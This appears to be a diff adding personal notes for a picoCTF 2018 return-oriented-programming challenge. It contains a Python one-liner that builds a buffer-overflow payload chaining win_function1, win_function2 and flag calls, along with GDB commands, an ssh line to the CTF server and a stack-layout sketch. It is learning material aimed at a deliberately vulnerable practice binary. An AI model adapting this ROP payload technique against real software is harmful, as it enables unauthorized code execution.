@@ -1,0 +1,41 @@
+Inside GDB:
+
+run <<< $(python -c "func1 = '\xcb\x85\x04\x08'; func2 = '\xd8\x85\x04\x08'; func_flag = '\x2b\x86\x04\x08'; arg1 = '\xad\xaa\xaa\xba'; arg2 = '\xad\xba\xad\xde'; print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG'+func1+func2+func_flag+arg1+arg2")
+
+
+gdb-peda$ print win_function1
+$32 = {<text variable, no debug info>} 0x80485cb <win_function1>
+gdb-peda$ print win_function2
+$33 = {<text variable, no debug info>} 0x80485d8 <win_function2>
+gdb-peda$ print flag
+$34 = {<text variable, no debug info>} 0x804862b <flag>
+
+# do this at each comparison to see what the values that will be compared are.
+x/8x $ebp
+
+ssh Seferan@2018shell.picoctf.com
+python -c "func1 = '\xcb\x85\x04\x08'; func2 = '\xd8\x85\x04\x08'; func_flag = '\x2b\x86\x04\x08'; arg1 = '\xad\xaa\xaa\xba'; arg2 = '\xad\xba\xad\xde'; print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG'+func1+func2+func_flag+arg1+arg2" | ./rop
+
+
+
+#from Martin Carlisle video
+#he includes actual return from win_function2....
+#not sure why he does it fro win_function2 and not win_function1
+#for me, i was able to just smal in the func_flag call...
+We ultimately want to call:
+
+win_function1()
+win_function2(0xBAAAAAAD)
+flag(0xDEADBAAD)
+
+So on the stack it should look like this:
+
+0xDEADBAAD
+RETURN ADDRESS
+&flag 0804862b
+0xBAAAAAAD
+RETURN ADDRESS 0804840d
+&win_function2 080485d8
+&win_function1 080485cb
+
+
